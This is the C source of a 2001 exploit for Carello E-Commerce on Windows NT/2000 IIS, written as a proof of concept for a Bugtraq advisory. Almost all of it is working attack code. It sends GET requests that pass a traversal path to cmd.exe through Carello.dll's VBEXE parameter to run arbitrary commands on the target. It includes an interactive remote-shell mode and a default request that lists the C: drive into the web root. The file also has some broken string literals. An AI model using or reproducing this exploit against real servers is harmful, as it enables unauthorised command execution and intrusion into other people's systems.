/*
 * Carello E-Commerce arbitrary command execution exploit for LiNUX
 * Tahum - Tahum@acmemail.net - 16/5/2001
 *
 * This code is the proof of concept of the advisory at Bugtraq of Peter
 * Grundl (again).
 *
 * - Affected Systems: Windows NT / 2K.
 *
 * Acknowledgements to all KernelPaniK (chiefly to MaDj0kEr for his help and
 * AciD-KrS), to mousetrap (thz for your support #@~! ;-)) and to Ripe and
 * Zhodiac for the same reason.
 *
 * Note: 90% code ripped from iis-zang.c. I'm too erratic for make a new code.
 *
 * Use this code at your own responsability.
 *
 * (C) 2001, HeliSec.
 *
 */

 #include <stdio.h>
 #include <netdb.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <signal.h>
 #include <errno.h>
 #include <fcntl.h>

 int usage(char *program);

 int main(int argc, char **argv)
 {
  short i, j, port=80, timeout=3, interactive=0;
  char temp[1];
  char host[512]=""; 
  char cmd[1024]="";
  char request[8192]="GET /scripts/Carello/Carello.dll?CARELLOCODE=SITE2&VBEXE=
		      C:\\..\\winnt\\system32\\cmd.exe+/c%20dir+/s%20C:\\%20>>
		      C:\\inetpub\\wwwroot\\logz.txt";

  struct hostent *he;
  struct sockaddr_in s_addr;

  fprintf(stderr, "\n ** Carello E-Commerce arbitrary command execution exploit for LiNUX **");
  fprintf(stderr, "\n By Tahum - Tahum@acmemail.net - 16/5/2001");
  fprintf(stderr, "\n (C) 2001, HeliSec.");
  fprintf(stderr, "\n Usage: %s host\n", argv[0]);

  for(i=0;i<argc;i++) {

   if(argv[i][0] == '-') {

     for(j=1;j<strlen(argv[i]);j++) {
	 switch(argv[i][j])
	 {
	   case 't':
	   strncpy(host, argv[i+1], sizeof(host));
	   break;

	   case 'c':
	   strncpy(cmd, argv[i+1], sizeof(cmd));
	   break;

	   case 'h':
	   usage(argv[0]);
	   break;

	   case 'o':
	   timeout=atoi(argv[i+1]); 
	   break;

	   case 'p':
	   port=atoi(argv[i+1]);
	   break;

	   case 'i':
	   interactive+=1;
	   break;

	   default:
	   usage(argv[0]);
	   break;
	}
       }
     }
   }

  if(!strcmp(host, ""))
   {
    fprintf(stderr, " ** Error: you need to specify the target host\n");
    usage(argv[0]);
   }

  if(!strcmp(cmd, "") && !interactive)
   {
     fprintf(stderr, " ** Error: you need to specify the command to execute\n");
     usage(argv[0]);
   }

  fprintf(stderr, " Target: %s:%d\n", host, port);
  if(!interactive) fprintf(stderr, " Command: %s\n", cmd);

  printf(" Timeout: %d seconds\n", timeout);
  if((he=gethostbyname(host))==NULL) 
  {
    fprintf(stderr, " ** Error: Target doesn't exist\n");
    usage(argv[0]);
  }

  do {

    if(interactive)
    {
      cmd[0]=0;
      printf("\nC:\\> ");
      if(fgets(cmd, sizeof(cmd), stdin)==NULL) fprintf(stderr, " ** Error: gets() error\n"); 
      cmd[strlen(cmd)-1]='\0';
      if(!strcmp("exit", cmd) || !strcmp("bye", cmd) || !strcmp("quit", cmd)) return(-1);

      for(i=0;i<strlen(cmd);i++) if(cmd[i]==' ') cmd[i]='+';

      strncpy(request, 
       "GET /scripts/Carello/Carello.dll?CARELLOCODE=SITE2&VBEXE=
	C:\\..\\winnt\\system32\\cmd.exe+/c", sizeof(request));
      strncat(request, cmd, sizeof(request) - strlen(request));
      strncat(request, "\n", sizeof(request) - strlen(request));

      s_addr.sin_family = PF_INET;
      s_addr.sin_port = htons(port);
      memcpy((char *) &s_addr.sin_addr, (char *) he->h_addr, 
	sizeof(s_addr.sin_addr));

      if((i=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP))==-1) 
      {
	fprintf(stderr, "** Error: Can't create socket\n");
        return(-1);
      }

      alarm(timeout);
      j = connect(i, (struct sockaddr *) &s_addr, sizeof(s_addr));
      alarm(0);

      if(j==-1) 
      {
	fprintf(stderr, " ** Error: Can't connect to %s\n", host);
	return(-1);
	close(i);
      }

      if(!interactive) printf(" Sending request: %s...\n", request);

      send(i, request, strlen(request), 0);

      if(!interactive) printf(" Getting results...\n");

      while(recv(i,temp,1, 0)>0)
      {
	alarm(timeout);
	printf("%c", temp[0]);
	alarm(0);
      }
    }
  } while(interactive);

   close(i);
   return(0);

 }

 int usage(char *program)
 {
   fprintf(stderr, " ** Usage: %s -t target_host [-c 'command' or -i] [-p port] [-o timeout]\n", program);
   fprintf(stderr, " ** Heh! it's the iis-zang syntax!\n");
   return(-1);
 }